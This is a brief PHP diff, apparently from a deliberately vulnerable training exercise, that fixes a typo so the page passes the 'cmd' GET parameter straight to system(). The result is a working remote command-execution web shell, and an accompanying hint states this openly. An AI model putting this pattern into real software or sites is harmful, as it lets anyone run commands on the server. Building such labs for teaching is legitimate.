@@ -13,5 +13,5 @@ hint("will exec the arg specified in the GET parameter \"cmd\"");
 </form>
 
 <?php
-    systemrer($_GET["cmd"]);
+    system($_GET["cmd"]);
  ?>
